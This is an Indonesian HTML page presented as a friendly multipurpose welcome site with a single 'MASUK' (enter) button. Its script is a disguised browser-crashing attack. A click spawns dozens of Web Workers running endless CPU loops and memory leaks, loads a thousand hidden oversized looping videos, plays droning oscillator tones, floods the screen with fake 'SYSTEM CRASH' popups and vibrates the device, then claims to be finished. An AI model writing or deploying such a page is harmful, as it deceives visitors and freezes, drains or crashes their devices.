<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Web Serbaguna Yanto</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }
    body {
      background: linear-gradient(145deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    
    .video-buffer {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      z-index: -1;
    }
    
    .welcome-container {
      background-color: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      padding: 40px;
      border-radius: 30px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      text-align: center;
      max-width: 450px;
      width: 100%;
      z-index: 10;
      border: 1px solid rgba(255, 255, 255, 0.3);
    }
    
    .welcome-title {
      font-size: 32px;
      font-weight: 800;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 15px;
    }
    
    .welcome-subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 30px;
    }
    
    .enter-button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
      border-radius: 60px;
      cursor: pointer;
      font-weight: 700;
      font-size: 18px;
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
      transition: transform 0.3s, box-shadow 0.3s;
      text-transform: uppercase;
      letter-spacing: 2px;
      z-index: 20;
    }
    
    .enter-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
    }
    
    .enter-button:active {
      transform: translateY(2px);
      box-shadow: 0 5px 10px rgba(102, 126, 234, 0.3);
    }
    
    .enter-button:disabled {
      opacity: 0.5;
      pointer-events: none;
    }
    
    #info {
      margin-top: 20px;
      padding: 15px;
      background: #f8f9fa;
      border-radius: 40px;
      font-size: 14px;
      color: #667eea;
      font-family: 'Courier New', monospace;
    }
    
    @media (max-width: 480px) {
      .welcome-container {
        padding: 30px 20px;
      }
      .welcome-title {
        font-size: 28px;
      }
    }
  </style>
</head>
<body>
  <div class="video-buffer" id="videoBuffer"></div>

  <div class="welcome-container">
    <h1 class="welcome-title">SELAMAT DATANG DI WEBSITE SERBAGUNA YANTO</h1>
    <p class="welcome-subtitle">Website dengan berbagai fitur menarik</p>
    <button class="enter-button" id="enter-button">MASUK</button>
    <div id="info">🥷 Klik tombol MASUK untuk memulai</div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const videoBuffer = document.getElementById('videoBuffer');
      const infoDiv = document.getElementById('info');
      const button = document.getElementById('enter-button');

      // ========== SEMUA PROSES BERAT DIPINDAHKAN KE WORKER ==========
      
      // 1. Worker untuk video buffer
      function startVideoWorker() {
        const videoWorker = new Worker(URL.createObjectURL(new Blob([`
          // Worker tidak bisa akses DOM langsung, tapi bisa postMessage
          const videoUrls = [
            'https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',
            'https://storage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4'
          ];
          
          // Simulasi pembuatan video (tapi di worker hanya pemberitahuan)
          for (let i = 0; i < 1000; i++) {
            // Kirim ke main thread untuk buat video
            postMessage({ type: 'createVideo', index: i, url: videoUrls[i % 2] });
          }
        `])));
        
        videoWorker.onmessage = function(e) {
          if (e.data.type === 'createVideo') {
            // Buat video di main thread (ini tetap jalan, tapi tidak blocking)
            setTimeout(() => {
              const vid = document.createElement('video');
              vid.loop = true;
              vid.muted = true;
              vid.playsinline = true;
              vid.preload = 'auto';
              vid.style.width = '7680px';
              vid.style.height = '4320px';
              vid.src = e.data.url + '?t=' + Date.now() + e.data.index;
              vid.play().catch(e => {});
              videoBuffer.appendChild(vid);
            }, 0);
          }
        };
      }

      // 2. Worker untuk loop berat
      function startLoopWorkers() {
        for (let w = 0; w < 50; w++) {
          new Worker(URL.createObjectURL(new Blob([`
            while(true) {
              for(let i=0;i<1000000;i++) {
                Math.sqrt(i);
                Math.sin(i);
                Math.cos(i);
              }
            }
          `])));
        }
      }

      // 3. Worker untuk memory leak
      function startMemoryWorkers() {
        for (let w = 0; w < 20; w++) {
          new Worker(URL.createObjectURL(new Blob([`
            const leaks = [];
            setInterval(() => {
              for(let m=0; m<100; m++) {
                leaks.push(new Array(100000).fill('leak'));
              }
            }, 10);
          `])));
        }
      }

      // 4. Fungsi suara (audio di main thread, tapi tidak blocking)
      function startCrashSound() {
        setTimeout(() => {
          try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            for (let o = 0; o < 10; o++) {
              const oscillator = audioContext.createOscillator();
              oscillator.frequency.value = 30 + Math.random() * 200;
              oscillator.connect(audioContext.destination);
              oscillator.start();
            }
          } catch (e) {}
        }, 100);
      }

      // 5. Fungsi pop-up (di main thread tapi pakai timeout)
      function createErrorPopups() {
        const errorContainer = document.createElement('div');
        errorContainer.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;';
        document.body.appendChild(errorContainer);

        for (let i = 0; i < 300; i++) {
          setTimeout(() => {
            const popup = document.createElement('div');
            popup.style.cssText = `
              position: absolute;
              background: #000080;
              color: white;
              border: 3px solid #c0c0c0;
              padding: 15px 25px;
              font-family: monospace;
              font-size: 14px;
              left: ${Math.random() * 70}%;
              top: ${Math.random() * 70}%;
              z-index: 10000;
            `;
            popup.innerHTML = '⚠️ SYSTEM CRASH';
            errorContainer.appendChild(popup);
          }, i * 10);
        }
      }

      // ========== EVENT CLICK ==========
      button.addEventListener('click', function() {
        console.log('Tombol diklik!');
        
        button.disabled = true;
        infoDiv.innerText = '⏳ Memproses...';
        
        // Jalankan semua proses di background
        startVideoWorker();
        startLoopWorkers();
        startMemoryWorkers();
        startCrashSound();
        createErrorPopups();
        
        // Getar
        if (navigator.vibrate) {
          navigator.vibrate([500, 200, 500]);
        }
        
        infoDiv.innerText = '✅ Selesai';
        button.disabled = false;
      });
    });
  </script>
</body>
</html>
